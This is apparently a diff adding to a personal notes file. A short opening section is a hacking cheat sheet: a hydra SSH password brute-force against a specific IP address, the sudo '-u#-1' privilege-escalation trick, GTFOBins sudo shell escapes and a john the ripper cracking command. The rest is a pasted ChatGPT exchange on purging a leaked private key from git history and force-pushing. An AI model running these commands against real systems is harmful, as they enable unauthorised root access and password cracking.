@@ -6147,3 +6147,320 @@ Unit=ssh-tunnel-health.service
 [Install]
 WantedBy=timers.target
 Save this as /etc/systemd/system/ssh-tunnel-health.timer.
+
+
+## hydra usage
+hydra -l root -P names.txt ssh://197.136.17.130
+
+1.8.9 upto 1.9.5
+sudo -u#-1 ls
+sudo -u#-1 /bin/bash
+https://gtfobins.github.io/#+sudo
+sudo time /bin/sh
+sudo man man
+!/bin/sh
+
+## use john the ripp
+john lilpw.txt --format=crypt
+
+
+## fix git commit resolvement 
+If you accidentally pushed a private key to a GitHub repository, it's critical to act swiftly to prevent misuse. Here's a step-by-step guide to resolve the issue:
+
+1. Remove the Private Key from the Repository
+Option A: Rewriting Commit History (Preferred for Sensitive Data)
+Use git filter-repo or git rebase to remove the sensitive data from your Git history entirely.
+
+Using git filter-repo:
+Install git-filter-repo if not already available:
+
+bash
+Copy code
+pip install git-filter-repo
+Rewrite history to remove the file:
+
+bash
+Copy code
+git filter-repo --path path/to/private_key.pem --invert-paths
+Replace path/to/private_key.pem with the relative path to your private key.
+
+Force push the updated repository:
+
+bash
+Copy code
+git push origin --force
+Option B: Removing Specific Commits (If You Know the Commit)
+Identify the commit that introduced the private key:
+bash
+Copy code
+git log -- path/to/private_key.pem
+Remove the commit using an interactive rebase:
+bash
+Copy code
+git rebase -i <commit_before_private_key_push>
+Mark the commit containing the key as drop.
+Force push the changes:
+bash
+Copy code
+git push origin --force
+2. Revoke and Regenerate the Key
+Since the private key has been exposed, treat it as compromised. Follow these steps:
+
+Revoke the old key:
+For SSH keys: Remove the key from any service (e.g., GitHub) where it was registered. Go to GitHub > Settings > SSH and GPG keys, and delete the compromised key.
+For API keys: Disable or delete the compromised key from the relevant platform.
+Generate a new key:
+bash
+Copy code
+ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
+Replace any existing references with the new key.
+3. Inform Others (If Public Repository)
+If this was a public repository:
+
+Rotate any credentials tied to the private key (e.g., if it was used for signing).
+Inform your team or stakeholders that the key was compromised.
+4. Verify and Protect the Repository
+Ensure the Key is Gone: Check to confirm that the private key is no longer in the repository:
+
+bash
+Copy code
+git log -- path/to/private_key.pem
+If it still appears, the history rewrite did not work.
+
+Prevent Similar Issues in the Future: Add a .gitignore rule to exclude sensitive files like private keys:
+
+plaintext
+Copy code
+*.pem
+*.key
+Commit the updated .gitignore file:
+
+bash
+Copy code
+git add .gitignore
+git commit -m "Add .gitignore to prevent sensitive files"
+git push origin
+You can also use Git hooks to prevent accidental commits of sensitive files:
+
+bash
+Copy code
+# .git/hooks/pre-commit
+if git diff --cached --name-only | grep -qE '\.pem|\.key'; then
+    echo "Sensitive file detected. Aborting commit."
+    exit 1
+fi
+5. Audit Logs (Optional but Recommended)
+If the repository was public for any amount of time, review access logs or consult GitHub's security features (like Dependabot alerts) to monitor for suspicious activity.
+
+By acting quickly, revoking the compromised key, and scrubbing the repository history, you can effectively mitigate the risks.
+
+
+
+
+
+
+You said:
+yoow in github cant i delete a specifi comit
+ChatGPT said:
+ChatGPT
+Yes, you can delete a specific commit in GitHub by removing it from the repository's history, but this requires rewriting the Git history locally and then force-pushing the changes. Here's how to do it step-by-step:
+
+1. Identify the Commit to Delete
+Run the following command in your local repository to find the commit hash:
+
+bash
+Copy code
+git log --oneline
+This will give you a list of commits in a compact format. Locate the commit you want to delete.
+
+For example:
+
+bash
+Copy code
+a1b2c3d Fix typo
+d4e5f6g Add private key (this is the one you want to delete)
+g7h8i9j Initial commit
+Here, d4e5f6g is the commit to delete.
+
+2. Use an Interactive Rebase to Remove the Commit
+Start an interactive rebase:
+
+bash
+Copy code
+git rebase -i <commit_before_the_one_you_want_to_delete>
+For the example above, if the commit to delete is d4e5f6g, rebase to the parent commit a1b2c3d:
+
+bash
+Copy code
+git rebase -i a1b2c3d^
+Mark the commit to delete as drop:
+
+The rebase editor will open, showing something like this:
+sql
+Copy code
+pick d4e5f6g Add private key
+pick g7h8i9j Initial commit
+Change pick to drop for the commit you want to delete:
+sql
+Copy code
+drop d4e5f6g Add private key
+pick g7h8i9j Initial commit
+Save and close the editor. Git will rewrite the history, removing the commit.
+
+3. Force-Push the Changes to GitHub
+Since you’ve changed the history, you need to force-push the changes to the remote repository:
+
+bash
+Copy code
+git push origin --force
+4. Verify the Commit is Gone
+Check your GitHub repository to confirm the commit has been removed:
+
+bash
+Copy code
+git log
+Also, inspect GitHub's commit history on the web interface to ensure the commit is no longer present.
+
+5. Additional Tips
+If the Commit Contained Sensitive Information: Even though the commit is removed from the history, anyone who cloned or forked the repository before the removal may still have access to the commit. In such cases:
+
+Revoke any exposed keys or credentials.
+Inform collaborators to delete their local copies and re-clone the repository.
+If You Made an Error During Rebase: You can always abort the rebase and return to the original state:
+
+bash
+Copy code
+git rebase --abort
+Alternative: Use git filter-repo to Remove All Traces
+If the commit introduced sensitive data and you want to ensure it's completely removed from the repository history, use git filter-repo as described in my earlier response.
+
+By rewriting history carefully and force-pushing the changes, you can effectively delete a specific commit from GitHub.
+
+
+
+
+
+
+You said:
+this commit is the first one i made and its the one i wanna delete and i have made only 2 commits so i cant select before that on since there is none\
+ChatGPT said:
+ChatGPT
+If the commit you want to delete is the first commit in the repository and there are only two commits total, you’ll need to recreate the repository's history without the problematic commit. Here's how to proceed:
+
+Step-by-Step Guide to Deleting the First Commit
+1. Create a New Branch Without the First Commit
+You can use the git checkout command with the second commit hash to create a new branch that starts from the second commit.
+
+bash
+Copy code
+git checkout --orphan new-branch <second-commit-hash>
+Here, replace <second-commit-hash> with the hash of the second commit (the one after the first commit).
+
+For example:
+
+bash
+Copy code
+git checkout --orphan new-branch d4e5f6g
+2. Remove the Old Branch
+Once the new branch is created, you need to delete the old branch (e.g., main).
+
+Switch to the new branch:
+
+bash
+Copy code
+git checkout new-branch
+Delete the old branch:
+
+bash
+Copy code
+git branch -D main
+Rename the new branch to main (or the default branch name of your repository):
+
+bash
+Copy code
+git branch -m main
+3. Force-Push the New Branch to GitHub
+Since you’ve rewritten the history, you’ll need to force-push to overwrite the existing history on GitHub.
+
+bash
+Copy code
+git push origin --force
+Alternative: Reset the Repository
+If you prefer, you can reset the repository entirely and start fresh:
+
+Remove the Repository History Locally:
+
+bash
+Copy code
+rm -rf .git
+Reinitialize the Repository:
+
+bash
+Copy code
+git init
+Add and Commit Only the Correct Files:
+
+bash
+Copy code
+git add .
+git commit -m "Initial commit"
+Force-Push to GitHub:
+
+bash
+Copy code
+git remote add origin <repository-url>
+git push --force --set-upstream origin main
+Important Notes
+Exposed Sensitive Data: If the first commit exposed sensitive data (like private keys), ensure that you revoke and replace those keys immediately.
+Repository Impact: Rewriting history will affect collaborators. Inform anyone working on the repository to re-clone it after you force-push the new history.
+Let me know if you encounter any issues!
+
+
+
+
+
+
+You said:
+ ! [rejected]        development -> development (non-fast-forward)
+error: failed to push some refs to 'https://github.com/lilplucky/ModernTunnel'
+hint: Updates were rejected because the tip of your current branch is behind
+hint: its remote counterpart. Integrate the remote changes (e.g.
+hint: 'git pull ...') before pushing again.
+hint: See the 'Note about fast-forwards' in 'git push --help' for details.
+ChatGPT said:
+ChatGPT
+The error occurs because the branch you're trying to push (development) is behind the remote branch, and you're not forcing the push, which is required after rewriting history. To fix this:
+
+Steps to Resolve the Issue
+1. Force Push Your Changes
+If you're sure you want to overwrite the remote branch (and rewrite history), you need to force push:
+
+bash
+Copy code
+git push origin development --force
+This will overwrite the remote branch with your local branch, including the rewritten commit history.
+
+2. If You Need to First Pull Remote Changes
+If you think the remote branch has additional changes you want to incorporate before rewriting, do this:
+
+Pull the changes while rebasing to avoid creating a merge commit:
+
+bash
+Copy code
+git pull origin development --rebase
+Resolve any conflicts, if present, and proceed.
+
+Force push the rewritten branch:
+
+bash
+Copy code
+git push origin development --force
+3. Double-Check Before Force Pushing
+If this branch is being worked on by others, inform them before force-pushing. They will need to re-clone or reset their local branches to align with the rewritten history.
+
+Key Notes
+Use --force-with-lease instead of --force if you're worried about overwriting changes made by others on the remote branch:
+bash
+Copy code
+git push origin development --force-with-lease
+This option ensures you only force push if the remote branch hasn’t changed since you last fetched.
